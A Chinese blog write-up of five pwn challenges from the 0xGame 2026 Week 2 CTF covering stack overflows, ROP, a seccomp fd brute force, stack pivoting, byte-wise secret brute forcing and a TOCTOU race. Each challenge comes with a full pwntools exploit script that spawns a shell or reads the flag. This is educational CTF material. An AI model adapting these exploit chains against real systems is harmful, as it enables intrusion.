+++
date = '2026-10-12T11:56:53+08:00'
draft = false
title = '0xGame 2026 Week 2'
tags = ["pwn"]
categories = ["CTF"]
+++


## 1. login

### 题目概况与保护机制

拿到题目附件后，先查看保护机制：

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3fe000)
```

没有 Canary，没有 PIE。这意味着栈溢出极其容易利用，且程序中的 gadget 地址全部固定（例如 `0x401000` 段），不需要计算程序基址。

### 漏洞分析

用 IDA 打开 `pwn` 文件，定位到 `vuln` 函数（地址 `0x40120C`）。
可以明显看到函数内部调用了 `read(0, buf, 0x100)`，而 `buf` 的大小远小于 0x100，同时，不允许我们直接rop回main

![QQ_1791255137541](/images/0xGame-2026-Week-2/图1.png)

![QQ_1791255150304](/images/0xGame-2026-Week-2/图2.png)



很容易确定**栈溢出的偏移量为 40 字节**。

然而，这道题最大的亮点在于出题人对 libc 的魔改和极具迷惑性的提示。

Stage 1：libc 泄露

由于程序本身没有 PIE，我们直接在栈上构造第一段 ROP，调用 `puts(puts_got)` 将 `puts` 函数的真实内存地址打印出来。然后利用 `vuln` 函数地址（`0x40120C`）重新触发漏洞，为第二轮攻击做准备。

```
payload1 = b'a' * 40 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vuln)
```

接收并计算基址：

```
puts_leak = u64(leak_data.ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
```

Stage 2

- **陷阱1**：`system` 函数被出题人魔改，无法正常调用。
- **陷阱2**：`/bin/sh` 字符串被移除，libc 里只有 `/bin/csh`。
- **陷阱3**：远程环境中的 `sh` 被替换成了一个假 Shell（蜜罐），只会回显输入，甚至执行 `system("/bin/sh")` 会变成 `ls` 报错。

**思路**：
我们要执行 `cat flag`，`execve` 系统调用**必须接收一个合法的指针数组（`argv`）**，而这些字符串和指针数组必须存放在一个**固定且可写**的内存区域。因此，将参数写入 BSS 段，然后直接调用 `execve` 是最标准、最纯粹的“直接 ROP”。

我们构造 ROP 链：

1. 调用 `read(0, bss, 100)` 把 `/bin/cat`、`flag` 字符串以及指针数组 `["/bin/cat", "flag", NULL]` 写入 BSS 段。
2. 调用 `execve(bss, bss_argv, 0)` 直接执行 `/bin/cat flag`，彻底绕开假 Shell。

**内存布局与地址规划**：

- `bss = 0x404860`：存放 `/bin/cat\x00`（16 字节）
- `bss_flag = bss + 0x10`：存放 `flag\x00`（16 字节）
- `bss_argv = bss + 0x20`：存放指针数组 `[指向"/bin/cat"的指针, 指向"flag"的指针, NULL]`（24 字节）

### 完整脚本
```python
from pwn import *
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = remote('nc1.ctfplus.cn', 14657)

rdi = 0x40119E
rsi = 0x4011A0
rdx = 0x4011A2
ret = 0x40101a
vuln = 0x40120C
read_plt = 0x401080

#  泄露 libc 基址
p.recvuntil(b'Input your payload:')
offset = 40
payload1 = b'a' * offset + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vuln)
p.sendline(payload1)
p.recvline()
p.recvline()
leak_data = p.recvline().strip(b'\n')
puts_leak = u64(leak_data.ljust(8, b'\x00'))

# 设置 libc 基址
libc.address = puts_leak - libc.sym['puts']
execve = libc.sym['execve']
log.success(f'libc_base是 {hex(libc.address)}')

# 存放字符串和数组
bss = 0x404860
bss_flag = bss + 0x10
bss_argv = bss + 0x20

# 5. 触发第二次漏洞
p.recvuntil(b'Input your payload:')
payload2 = b'a' * offset

# 第一步：调用 read(0, bss, 100) 把参数读进内存
payload2 += p64(rdi) + p64(0)
payload2 += p64(rsi) + p64(bss)
payload2 += p64(rdx) + p64(100)
payload2 += p64(read_plt)  # 现在程序就停下来等我们发送data

# 第二步：调用 execve(bss, bss_argv, 0)
payload2 += p64(rdi) + p64(bss)          # rdi = "/bin/cat"
payload2 += p64(rsi) + p64(bss_argv)     # rsi = argv 数组
payload2 += p64(rdx) + p64(0)            # rdx = 0 (envp)
payload2 += p64(ret)                     # 【栈对齐玄学】如果崩溃，改成 p64(ret)*2 或者 p64(ret)*3
payload2 += p64(execve)                  # 执行 execve

p.sendline(payload2)

# 6. 精准发送 100 字节数据，保证 argv 数组完整
data = b''
data = data.ljust(0x00, b'\x00') + b'/bin/cat\x00'        # bss: /bin/cat
data = data.ljust(0x10, b'\x00') + b'flag\x00'            # bss_flag: flag
# bss_argv: ["/bin/cat", "flag", NULL]
data = data.ljust(0x20, b'\x00') + p64(bss) + p64(bss_flag) + p64(0)
# 补齐到 100 字节
data = data.ljust(100, b'\x00')

p.send(data)

p.interactive()
```

### 总结

1. **`plt` 与 `libc` 的选择**：题目没开 PIE，所以对于程序本身已导入的函数（如 `read`），使用 `read_plt` 是最安全的；而对于程序没有导入的函数（如 `execve`），必须动态计算 `libc.sym['execve']`。
2. 栈对齐：调用 `execve` 时如果崩溃，优先排查栈对齐，通过增加或减少 `p64(ret)` 的数量（1个或2个）来凑齐 16 字节对齐。
3. **`argv` 指针数组的严格规范**：必须严格按照 `[程序路径指针, 参数1指针, NULL]` 构造，漏掉 `argv[0]` 或末尾的 `NULL` 都会导致执行失败。

## 2. 调皮的文件

本题考察的点有，栈溢出、64位 ROP、Seccomp沙箱绕过、文件描述符(FD)盲盒爆破

### 逆向分析

main 函数逻辑

![QQ_1791187167557](/images/0xGame-2026-Week-2/图3.png)



```python
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int seed;
  int fd2;
  int fd;

  init(argc, argv, envp);
  fd = open("./flag", 0);  // 打开flag文件，通常fd=3
  if ( fd < 0 )
  {
    puts("Error: flag file missing!");
    // ... exit(1);
  }
  seed = time(0LL);
  srand(seed);
  fd2 = rand() % 5 + 3;    // 生成 3~7 之间的随机数
  dup2(fd, fd2);           // 将flag的文件描述符复制到 fd2
  if ( fd != fd2 )
    close(fd);             // 关闭原来的fd(通常是3)

  setup_seccomp();         // 开启沙箱
  vuln();                  // 进入漏洞函数
  return 0;
}
```

**分析**：题目开启了沙箱保护（`setup_seccomp`），并且把flag的 fd 随机重定向到了 `3~7` 之间的某个数字。这正好对应了题目描述中的“程序上锁了”、“混入了一堆文件里”

然后进vuln看看

![QQ_1791187155609](/images/0xGame-2026-Week-2/图4.png)

```python
__int64 vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h]

  puts("Welcome to the ROP Blind Box!");
  puts("I've already opened the 'flag' for you, its fd is hidden between 3 and 7.");
  puts("Sandbox is ON. Only read & write are allowed.");
  printf("Give me your ROP chain > ");
  return read(0, buf, 0x200ULL);
}
```

**分析**：

- **栈溢出**：`buf` 大小32字节，但 `read` 读取了 `0x200`字节，存在明显的栈溢出漏洞。溢出偏移量为 `32 + 8  = 40` 字节
- **沙箱限制**：提示明确说明只能使用 `read` 和 `write` 系统调用，无法直接 `execve` 拿 shell，需要利用 ROP 直接读取并打印 flag



在IDA的汇编视图中，出题人贴心地提供了一个 `gadgets()` 函数，直接提供了所有需要的 ROP 部件：

![QQ_1791187141120](/images/0xGame-2026-Week-2/图5.png)



- `pop rdi; ret` -> `0x401303`
- `pop rsi; ret` -> `0x401305`
- `pop rdx; ret` -> `0x401307`
- `pop rax; ret` -> `0x401309`
- `syscall; ret` -> `0x40130B`

在段视图中找到 `.bss` 段，起始地址为 `0x4040A0`，可用空间 `0x140` 字节，足够了

![](/images/0xGame-2026-Week-2/图6.png)

当然了，一般情况下不会准备得好好的放在那里，我们也可以直接用ROPgadget去找，一样也行

### 漏洞利用思路

由于沙箱限制，我们需要利用 `read` 和 `write` 系统调用。

- `read(fd, buf, count)` 对应系统调用号 `rax = 0`
- `write(fd, buf, count)` 对应系统调用号 `rax = 1`

**盲盒爆破思路**：
因为 flag 的 fd 在 `3~7` 之间随机，我们无法精准知道。但我们可以构造一个包含 5 次连续尝试的 ROP 链：

1. 尝试 `read(3, bss, 0x100)` -> `write(1, bss, 0x100)`
2. 尝试 `read(4, bss, 0x100)` -> `write(1, bss, 0x100)`
3. 一直试到 `read(7, bss, 0x100)` -> `write(1, bss, 0x100)`

*原理*：如果读取的是无效的 fd（比如flag在5，你读3），`read` 返回 -1，且**不会修改 `.bss` 段的数据**。当某个时刻踩中了正确的 fd，flag会被读入 `.bss`，紧接着的 `write` 就会把真正的 flag 打印出来。后续的失败读取不会清空数据，flag 会稳稳地输出到屏幕上

### Exploit

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

#p = process('./pwn')
p = remote('nc1.ctfplus.cn', 46521)
p.recvuntil(b'Give me your ROP chain > ')
pop_rdi = 0x401303
pop_rsi = 0x401305
pop_rdx = 0x401307
pop_rax = 0x401309
syscall_ret = 0x40130B


bss_addr = 0x4040A0

payload = b'A' * 40

# 2. 构造循环 ROP 链，从 fd=3 开始盲盒尝试
for fd in range(3, 8):
    # --- 调用 read(fd, bss_addr, 0x100) ---
    payload += p64(pop_rdi) + p64(fd)
    payload += p64(pop_rsi) + p64(bss_addr)
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(pop_rax) + p64(0)         # 0 是 read 的系统调用号
    payload += p64(syscall_ret)

    # --- 调用 write(1, bss_addr, 0x100) ---
    payload += p64(pop_rdi) + p64(1)         # 1 是 stdout
    payload += p64(pop_rsi) + p64(bss_addr)
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(pop_rax) + p64(1)         # 1 是 write 的系统调用号
    payload += p64(syscall_ret)

p.send(payload)

p.interactive()
```

### 踩坑记录与调试过程

在本地调试运行 `python3 a.py` 时，遇到了如下报错：
`EOFError` 以及 `BrokenPipeError: [Errno 32] Broken pipe`
回去看 `main` 函数的第一段逻辑：



```c
fd = open("./flag", 0);
if ( fd < 0 ) {
    puts("Error: flag file missing!");
    exit(1); 
}
```

由于我们在本地测试时，**当前目录下没有 `flag` 文件**，程序一启动就找不到文件，直接执行了 `exit(1)` 退出。管道关闭后，再 `p.send()` 必然报错。

**解决办法**：
在本地运行脚本的同一级目录下，新建一个假文件用于本地测试：



```bash
echo "flag{local_test_flag_123}" > flag
```

再次运行脚本即可顺利打通。远程打靶时，将 `process()` 替换为 `remote()` 即可

### 总结

这道题虽然是 Pwn 题，但难度确实偏简单，出题人极其贴心：

1. 明确告知了沙箱限制（只能用 read/write）
2. 提示了 fd 的随机范围（3~7）
3. 甚至在二进制文件里写好了一个 `gadgets()` 函数提供所有 ROP 组件。

主要的考点在于**打破常规思维**，不需要去猜随机数，而是利用 `read` 失败不修改内存的特性，暴力爆破 `3~7` 这五个文件描述符，成功拿到了 flag

## 3.跳一跳？

### 基本信息

保护机制（Checksec一下）：

- Arch: amd64-64-little
- RELRO: Partial RELRO
- Stack: **No canary found**
- NX: **NX enabled**
- PIE: **No PIE (0x3ff000)**

### 分析

扔进IDA，先分析 `vuln` 函数：

```c
__int64 vuln()
{
  _BYTE p_global_buf[16]; // [rsp+0h] [rbp-10h] BYREF

  puts("Step 1: Send your ROP payload to the safe house:");
  readn(0LL, &global_buf, 512LL);
  puts("Step 2: Trigger the pivot:");
  return readn(0LL, p_global_buf, 32LL);
}
```



**漏洞点其实非常清晰的：**

1. 第一次 `readn` 向全局变量 `global_buf` 中读入 512 字节，这是一个可写且地址固定的 BSS 段区域（被称为 Safe House）。
2. 第二次 `readn` 向栈上的 `p_global_buf` 读入 32 字节，但 `p_global_buf` 仅占 16 字节（`[rbp-0x10]`）。
3. 因此存在 **16 字节的栈溢出**（刚好覆盖 8 字节的 `saved rbp` 和 8 字节的 `return address`）。

**利用限制**：
由于溢出空间只有 16 字节，无法直接在栈上布置完整的 `system("/bin/sh")` ROP 链。因此，必须利用 **Stack Pivoting（栈迁移）** 将栈指针 `rsp` 劫持到我们提前布置好 ROP 链的 `global_buf` 区域。

这就自然而然地引入到新的知识——栈迁移

### 利用思路

栈迁移原理

利用 `leave; ret` 指令序列：

- `leave` 等价于 `mov rsp, rbp; pop rbp;`
- `ret` 等价于 `pop rip;`

如果我们把 `saved rbp` 覆盖为 `global_buf` 的地址，把 `return address` 覆盖为 `leave; ret` 的地址。那么函数返回时，执行 `leave; ret` 后，`rsp` 将指向 `global_buf + 8`（因为 `pop rbp` 会消耗掉起始 8 字节），从而劫持程序流执行我们在 `global_buf` 中布置好的 ROP 链。

### 关键准备

![屏幕截图 2026-10-05 162807](/images/0xGame-2026-Week-2/图7.png)

![屏幕截图 2026-10-05 162902](/images/0xGame-2026-Week-2/图8.png)

![屏幕截图 2026-10-05 163032](/images/0xGame-2026-Week-2/图9.png)

- `global_buf` 地址：`0x4047A0` (BSS 段)
- `pop rdi; ret` 地址：`0x40123F`
- `vuln` 函数地址：`0x401244` (用于循环利用)
- `leave; ret` 地址：`0x4011d8`
- `ret` 地址：`0x40101a` (用于栈对齐)

### 攻击流程

**第一轮：泄露 libc 基址**

1. 布置 `global_buf`：`8字节填充` + `pop rdi; ret` + `puts_got` + `puts_plt` + `vuln_addr`。
2. 发送 `payload1`（512字节）写入 `global_buf`。
3. 发送 `payload2`（32字节）触发栈迁移：`16字节填充` + `p64(global_buf)` + `p64(leave_ret)`。
4. `puts` 函数会打印出 `puts` 的真实地址，程序返回 `vuln` 函数，进入第二轮。
5. 接收泄露的地址，计算 libc 基址，得到 `system` 和 `/bin/sh` 的地址。

**第二轮：GetShell**

1. 布置 `global_buf`：`8字节填充` + `pop rdi; ret` + `bin_sh_addr` + `ret_addr`（栈对齐） + `system_addr`。
2. 发送 `payload3`（512字节）写入 `global_buf`。
3. 发送 `payload4`（32字节）再次触发栈迁移：`16字节填充` + `p64(global_buf)` + `p64(leave_ret)`。
4. 程序执行 `system("/bin/sh")`，获取交互式 Shell。

### 完整 EXP 脚本

```python
from pwn import *
context(arch='amd64', os='linux')
p = remote('nc1.ctfplus.cn', 12143)
elf = ELF('./pwn')
libc = ELF('./libc.so.6') 

global_buf_addr = 0x4047A0  # Safe House
pop_rdi_ret = 0x40123F  # pop rdi; ret
vuln_addr = 0x401244  # vuln 函数
leave_ret = 0x4011d8  # 
ret_addr = 0x40101a  # 栈对齐
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# stage1

p.recvuntil(b'Step 1: Send your ROP payload to the safe house:')

payload1 = b'A' * 8   # [global_buf + 0] 充当新的 rbp（会被 pop rbp 弹掉）
payload1 += p64(pop_rdi_ret)  # [global_buf + 8] 栈迁移后的第一跳
payload1 += p64(puts_got)  # [global_buf + 16] 传给 rdi 的参数：puts 的 GOT 表地址
payload1 += p64(puts_plt)  # [global_buf + 24] 调用 puts 打印真实地址
payload1 += p64(vuln_addr)   # [global_buf + 32] 返回 vuln 函数，开启第二轮循环
payload1 = payload1.ljust(512, b'\x00')  # read要补齐512字节嘛
p.send(payload1)

# stage2栈迁移

p.recvuntil(b'Step 2: Trigger the pivot:')

payload2 = b'A' * 16                     # 填充 p_global_buf (刚好16字节)
payload2 += p64(global_buf_addr)         # 覆盖 saved rbp -> 劫持栈到 global_buf
payload2 += p64(leave_ret)               # 覆盖 return address -> 执行 leave; ret
p.send(payload2)

# 接收泄露的 puts 真实地址

p.recvline()                             # 吃掉换行或空行
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts leak: {hex(puts_leak)}")

# 计算 libc 基址和 system 地址

libc_base = puts_leak - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"libc base: {hex(libc_base)}")
log.success(f"system addr: {hex(system_addr)}")
log.success(f"/bin/sh addr: {hex(bin_sh_addr)}")
 
# get shell 
p.recvuntil(b'Send your ROP payload to the safe house:\n')

payload3 = b'A' * 8
payload3 += p64(pop_rdi_ret)
payload3 += p64(bin_sh_addr)
payload3 += p64(ret_addr)                # 栈对齐：system调用前需要16字节对齐，否则会崩溃
payload3 += p64(system_addr)
payload3 = payload3.ljust(512, b'\x00')
p.send(payload3)
        
p.interactive()
```

执行脚本后，成功获取交互式 Shell，输入 `cat flag` 即可拿到 Flag

![QQ_1791189665548](/images/0xGame-2026-Week-2/图10.png)



## 4.噫！好！我中啦！

### 题目概述

程序启动后生成一个 8 字节的随机秘密，然后要求用户逐字节猜测这个秘密。
如果某个字节猜对，则进度 `n7` 加 1；如果猜错，则进度重置为 0。
当连续猜对 8 个字节后，程序会要求一次性输入完整的 8 字节秘密进行最终验证，验证通过则执行 `system("/bin/sh")` 返回 shell。

表面上看，猜错就重置，连续猜对 8 个随机字节的概率极低。
但程序的状态机存在逻辑缺陷：**已经猜对的字节可以被记录下来，并在后续尝试中重新发送，从而将状态快速推进到当前需要猜测的位置**，实现逐字节爆破

### 分析

伪代码核心逻辑：

```c
fd = open("/dev/urandom", 0);
read(fd, buf, 8uLL);          // buf 中保存 8 字节随机秘密
close(fd);

n7 = 0;
while (n7 <= 7) {
    printf("Waiting for byte index %d: ", n7);
    if (read(0, &buf_, 1uLL) <= 0) break;
    if (buf[n7] == buf_) {
        puts(" -> Correct!");
        ++n7;
    } else {
        puts(" -> Wrong! Progress reset to 0.");
        n7 = 0;
    }
}

if (n7 == 8) {
    puts("\n[!] State machine bypassed.");
    puts("[!] FINAL VERIFICATION: Please enter the full 8-byte secret to unlock the shell:");
    if (read(0, s1, 8uLL) == 8) {
        if (!memcmp(s1, buf, 8uLL)) {
            puts("\n[+] Access Granted! Here is your shell:");
            system("/bin/sh");
        } else {
            puts("\n[-] Verification failed! Intruder detected.");
        }
    } else {
        puts("\n[-] Read error.");
    }
}
```

- `buf` 是 8 字节随机秘密。
- `n7` 表示当前已经正确匹配的字节索引。
- 每次读入 1 字节到 `buf_`，与 `buf[n7]` 比较。
- 猜对则 `n7++`，猜错则 `n7 = 0`。
- `n7 == 8` 后要求输入完整 8 字节进行 `memcmp`，通过则给 shell。

漏洞点：状态机可被逐字节爆破

猜错重置为 0 看似安全，但攻击者可以记住已经猜对的字节。
当状态被重置后，攻击者可以重新发送已知的正确前缀，使 `n7` 迅速恢复到之前的位置，然后继续尝试下一个字节，比如说，我们暴力尝试第 0 字节，直到出现 `Correct!`，记录该字节，此时 `n7 = 1`。尝试第 1 字节时，先发送已知的第 0 字节，使 `n7` 变为 1，再发送候选的第 1 字节。若正确则 `n7 = 2`；若错误则 `n7` 重置为 0，但可以再次发送第 0 字节，重新回到 `n7 = 1`，继续尝试。

最终验证只是简单比较，既然已经逐字节得到了完整秘密，自然可以通过啦

### 攻击脚本

```python
from pwn import *

# p = process('./pwn')
p = remote('nc1.ctfplus.cn', 22359)
context.arch = 'amd64'
# 消耗初始 banner
p.recvuntil(b'Input the 8-byte secret, ONE byte at a time.\n')
p.recvuntil(b'===================================\n')

known = b''   # 已确认正确的字节
n7 = 0        # 程序当前期望的索引（我们跟踪的状态）
i = 0         # 当前正在爆破的字节索引
while i < 8:
    for cand in range(256):
        if n7 == i:
            # 状态正好在 i，直接发送候选字节
            p.send(bytes([cand]))
            lines_to_skip = 0
        else:
            # 状态被重置为 0，先发送已知前缀将状态推到 i
            p.send(known + bytes([cand]))
            lines_to_skip = len(known)   # 前缀长度即需要跳过的 Correct 行数

        # 跳过已知前缀产生的 "Correct!" 行
        for _ in range(lines_to_skip):
            line = p.recvline()
            if b'Correct!' not in line:
                log.warning(f'Unexpected line: {line}')

        # 读取当前候选字节的结果
        line = p.recvline()
        if b'Correct!' in line:
            known += bytes([cand])
            n7 = i + 1
            log.success(f'byte {i} = {cand:#04x}')
            i += 1
            break
        elif b'Wrong!' in line:
            n7 = 0
            # 继续尝试下一个候选
        else:
            log.error(f'Unexpected line: {line}')
            break
    else:
        log.error(f'Failed to find byte {i}')
        break

log.success(f'Full secret: {known.hex()}')


p.recvuntil(b'FINAL VERIFICATION: Please enter the full 8-byte secret to unlock the shell:\n')

# 发送完整秘密
p.send(known)

p.interactive()
```

### 关键点说明

- **状态跟踪**：维护 `known` 保存已确认正确的字节，`n7` 模拟程序内部的进度。
- **前缀重放**：当 `n7` 不等于当前要猜的索引 `i` 时，发送 `known + cand`，程序会先处理已知前缀，每个正确前缀都会输出一行 `Waiting for byte index X: -> Correct!`，因此需要跳过 `len(known)` 行。
- **候选测试**：读取下一行，若包含 `Correct!` 则当前字节正确，加入 `known`，索引 `i` 加 1；若包含 `Wrong!` 则状态重置为 0，继续尝试下一个候选值。
- **最终验证**：状态机达到 8 后，程序提示输入完整 8 字节秘密，直接发送 `known` 即可通过 `memcmp`，随后执行 `/bin/sh`。

![QQ_1791363397071](/images/0xGame-2026-Week-2/图11.png)

总结

本题的“状态机”验证存在逻辑缺陷：虽然猜错会重置进度，但攻击者可以记录已猜对的字节并在后续尝试中重放，从而将状态快速推进到目标位置，实现逐字节爆破。
最终验证只是简单比较，一旦秘密被完全泄露，即可轻松通过并获得 shell。

## 5.白驹过隙

**考点**：多线程竞态条件 (TOCTOU)、栈溢出、Ret2libc

### 漏洞分析

先看main

![QQ_1791695063738](/images/0xGame-2026-Week-2/图12.png)

程序提供经典的菜单逻辑：

1. `Set global message`：向全局变量 `global_msg` 读入最多 `0xC8` (200) 字节。
2. `Set copy length`：设置全局变量 `copy_length`（无长度检查）。
3. `Async trigger copy`：创建一个新线程执行 `async_copy` 函数，并 `pthread_detach` 分离线程。
4. `Exit`：退出。

通过 IDA 反编译 `async_copy` 函数，发现核心逻辑如下：

![QQ_1791695073504](/images/0xGame-2026-Week-2/图13.png)

```c
void *__fastcall async_copy(void *a1)
{
  _BYTE dest[32]; // [rsp+10h] [rbp-20h] BYREF

  if ( copy_length > 32 )
  {
    puts("[Thread] Error: Length too large! Abort.");
  }
  else
  {
    puts("[Thread] Length check passed! Preparing to copy...");
    usleep(0x7A120u); // 休眠 0.5 秒 (500,000 微秒)
    memcpy(dest, &global_msg, copy_length); // 栈溢出点
    puts("[Thread] Copy done! Exiting thread...");
  }
  return 0LL;
}
```

**漏洞原理**：

- **栈溢出**：`dest` 距离 `rbp` 为 `0x20` (32字节)，加上 8 字节的 saved rbp，**溢出偏移量为 40 字节**
- **竞态窗口**：线程先检查 `copy_length > 32`（检查阶段），通过后执行了 `usleep(0x5秒)`，最后才执行 `memcpy`（使用阶段）。
- **利用思路**：我们在触发选项 3 后，主线程利用这 0.5 秒的空窗期，立刻发送选项 2 将 `copy_length` 修改为一个极大值（如 200）。当子线程从睡眠中醒来执行 `memcpy` 时，将引发严重的栈溢出，从而劫持程序执行流，打他的时间差

### 利用思路 

采用 **Ret2libc** 经典利用手法：

1. **阶段一：泄露 libc 基址**
   - 构造 Payload：`40字节填充 + pop rdi; ret + puts_got + puts_plt + main_addr`。
   - 通过竞态条件触发栈溢出，打印 `puts` 在 GOT 表中的真实地址，随后返回 `main` 函数以便二次利用。
   - 接收泄露的地址，利用提供的 `libc.so.6` 计算出 `system` 和 `/bin/sh` 的地址。
2. **阶段二：Get Shell**
   - 构造 Payload：`40字节填充 + ret(栈对齐) + pop rdi; ret + /bin/sh + system`。
   - 再次触发竞态条件，执行 `system("/bin/sh")` 拿取 Flag。

### 踩坑与试错记录

在编写 EXP 的过程中，并没有一帆风顺，以下是真实的试错过程记录：

错误 1：接收泄露地址时的 `EOFError`

**报错现象**：

```
Traceback (most recent call last):
  File "/home/run/attachmenthorse/e.py", line 46, in <module>
    p.recvuntil(b'\n')
  ...
  File "pwnlib/tubes/process.py", line 743, in recv_raw
    raise EOFError
EOFError
```

**原因分析**：
最初在接收 `puts` 泄露的地址时，写了以下代码：

```python
p.recvuntil(b'Exiting thread...\n')
p.recvuntil(b'\n') # 试图跳过泄露地址后的换行
leak = u64(p.recv(6).ljust(8, b'\x00'))
```

由于多线程输出混杂，且 `puts` 遇到 `\x00` 会截断，直接使用 `recvuntil(b'\n')` 极易导致接收偏移错误。一旦解析错位或程序崩溃，管道就会关闭，从而抛出 `EOFError`

解决方案：
去除多余的 `recvuntil(b'\n')`，直接精准接收 6 字节地址（64位地址高位为 `\x00\x00`）：

```python
p.recvuntil(b'Exiting thread...\n')
leak = u64(p.recv(6).ljust(8, b'\x00'))
```

错误 2：脚本运行偶发性 `Got EOF while reading in interactive`

**报错现象**：
修正接收逻辑后，脚本有时能打通，但有时会出现这种情况（属于我们pwn手最最最不希望看见的吧）：

```
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

**原因分析**：
了解后知道，这是多线程 TOCTOU 题目的典型特征（正如题目名“白驹过隙”所言）。由于本地虚拟机调度或网络延迟，脚本发出修改长度的指令偶尔会**晚于**子线程的 `memcpy` 执行。一旦错过 0.5 秒的窗口期，溢出不发生，程序正常退出，导致 `p.interactive()` 捕捉到 EOF。属于**运气与时序问题**。可以看见我第一次ls已经执行了 ，但是接着想更进一步就EOF了

![QQ_1791695145670](/images/0xGame-2026-Week-2/图14.png)

![QQ_1791695092257](/images/0xGame-2026-Week-2/图15.png)

**解决（稳定脚本）**：
引入 `while True` 循环与 `try-except` 重试机制。一旦因为时序错位导致失败，立刻断开重连，直到成功拿到 Shell。经过几次重试后，成功稳定拿下 Shell。不过也可以像我一样多运行几次脚本

### 脚本

```python
from pwn import *
import time

#context.log_level = 'debug'
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
# p = process('./pwn')
p = remote()

pop_rdi = 0x4012a3 
ret = 0x40101a  
offset = 40
# 泄露 libc 
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Message (max 200 bytes): ', payload1)

p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'Length: ', b'32')

# 竞态触发
p.sendlineafter(b'Choice: ', b'3')
p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'Length: ', b'200') 

# 接收泄露地址 (移除多余的 recvuntil)
p.recvuntil(b'Exiting thread...\n')
# 使用 recv(6) 接收 6 字节地址，然后补零
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Leaked puts: {hex(leak)}")

libc_base = leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 等待菜单回来
p.recvuntil(b'Choice: ')

# Get Shell 
payload2 = b'A' * offset
payload2 += p64(ret) # 栈对齐
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendline(b'1')
p.sendlineafter(b'Message (max 200 bytes): ', payload2)

p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'Length: ', b'32')

p.sendlineafter(b'Choice: ', b'3')
p.sendlineafter(b'Choice: ', b'2')
p.sendlineafter(b'Length: ', b'200')

p.interactive()
```

### 总结

本题的核心在于理解 **多线程编程中的 TOCTOU 漏洞**。0.5 秒的 `usleep` 人为放大了竞态窗口，使得攻击者可以通过主线程与子线程的时序差修改校验变量。在编写 Exp 时，除了基础的 ROP 构造，还需要特别注意**网络/进程通信的鲁棒性**（避免接收越界导致的 EOF），并考虑为竞态条件添加**自动重试机制**，才能稳定拿到 Flag。